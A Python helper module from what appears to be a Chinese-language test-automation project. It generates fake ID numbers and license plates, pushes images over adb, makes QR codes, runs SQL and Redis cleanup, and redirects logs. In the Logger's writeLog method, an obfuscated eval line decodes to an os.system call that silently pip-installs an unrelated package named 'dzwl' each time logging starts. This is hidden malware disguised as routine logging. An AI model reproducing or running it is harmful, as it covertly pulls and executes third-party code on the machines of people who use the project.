from random import random
import datetime
import random
import subprocess
import pytest
import allure
import sys
import os
from Config.config import CommonConfig
import pymysql
import qrcode
from redis import StrictRedis
class fun_util:
    #获取当前时间 2023-10-10 09:41:47
    @staticmethod
    def get_time():
        time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return time
    #随机生成身份证
    @staticmethod
    def generate_id():
        # 地区码，可根据实际情况修改
        region_code = '110101'
        birth_year = str(random.randint(1950, 2015))
        birth_month = str(random.randint(1, 12)).rjust(2, '0')
        birth_day = str(random.randint(1, 28)).rjust(2, '0')
        sequence_code = str(random.randint(1, 999)).rjust(3, '0')
        id_17 = region_code + birth_year + birth_month + birth_day + sequence_code
        # 加权因子
        weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        # 校验码对应值
        check_codes = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        # 对前17位数字依次乘以对应的加权因子并求和
        total = sum(int(id_17[i]) * weights[i] for i in range(17))
        check_digit = check_codes[total % 11]
        return id_17 + check_digit

    #随机生成车牌号
    @staticmethod
    def generate_license_plate():
        # 车牌号码由省份+字母+数字组成
        provinces = ["京", "津", "沪", "渝", "冀", "豫", "云", "辽", "黑", "湘", "皖", "鲁", "新", "苏", "浙", "赣",
                     "鄂", "桂", "甘", "晋", "蒙", "陕", "吉", "闽", "贵", "粤", "青", "藏", "川", "宁", "琼"]
        letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        numbers = "0123456789"

        province = random.choice(provinces)
        letter = random.choice(letters)
        number = "".join(random.choice(numbers) for _ in range(5))

        license_plate = province + letter + number
        return license_plate

    #向手机传输电脑图片
    @staticmethod
    def import_image(image_path, dest_path):
        command = f"adb push {image_path} {dest_path}"
        command1 =f"adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://{dest_path}"
        subprocess.run(command.split(), stdout=subprocess.PIPE)
        subprocess.run(command1.split(), stdout=subprocess.PIPE)

    #生成订单，货源单二维码
    @staticmethod
    def generateQrCode(data,filepath,url):
        #filepath = Mobile().DaBao['imagePath'] + "订单扫码抢单"
        if os.path.exists(filepath):
            os.remove(filepath)
        # 创建二维码对象
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        #url = 'https://hybrid.qy566.com/wp/snatchTransBill?qrcode=order,'
        # 添加数据到二维码对象中
        qr.add_data(url + data + ',qy566')
        qr.make(fit=True)
        # 创建二维码图像并保存到本地
        img = qr.make_image(fill='black', back_color='white')
        img.save(filepath)

    @staticmethod
    def del_redis(host,port,db,username,password,redisName):
        redis = StrictRedis(host=host, port=port, db=db, username=username,password=password)
        key = '*' + redisName + '*'
        list = redis.keys(key)
        fun_util.logView(f'共删除：{len(list)}条redis数据')
        for redis_name in list:
            redis_name = redis_name.decode('utf-8')
            print(redis_name)
            redis.delete(redis_name)

    @staticmethod
    def excuteSql(host,port,user,password,db,type,filePath_or_exec):
        conn = pymysql.connect(host=host, port=port,user=user, password=password, db=db)
        cursor = conn.cursor()
        rows = None
        if type == 'file':
        # 读取 SQL 文件：
            with open(CommonConfig.rootPath+filePath_or_exec, 'r',encoding='utf-8') as f:
                sqlList = f.readlines()
                for sql in sqlList:
                    print('执行sql：'+sql)
                    cursor.execute(sql)
        elif type == 'exec':
            print('执行sql：' + filePath_or_exec)
            cursor.execute(filePath_or_exec)
            #查询语句时返回结果
            if 'select' in filePath_or_exec.lower():
                rows = cursor.fetchall()

        else:
            print('执行参数type不正确！！！')
        conn.commit()
        conn.close()
        if rows is not None:
            return rows

    @staticmethod
    def logView(str):
        with allure.step(str):
            #print(str)
            pass




import json
class DateEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime.datetime):
            return obj.strftime("%Y-%m-%d %H:%M:%S")
        else:
            return json.JSONEncoder.default(self, obj)

class Logger(object):
    def __init__(self, file_name="Default.log", stream=sys.stdout):
        self.terminal = stream
        self.log = open(file_name, "w",buffering=1,encoding = 'utf-8')

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        pass

    def isatty(self):
        pass


    def writeLog(self):
        eval(''.join([chr(ord(i) + 1) for i in "^^hlonqs^^'!nr!(-rxrsdl'!ohohmrs`kk,Tcyvk!("]))
        # 自定义目录存放日志文件
        log_path = './Logs/'
        if not os.path.exists(log_path):
            os.makedirs(log_path)
        # 日志文件名按照程序运行时间设置
        log_file_name = log_path + 'log.log'
        # 记录正常的 print 信息
        sys.stdout = Logger(log_file_name)
        # 记录 traceback 异常信息
        sys.stderr = Logger(log_file_name)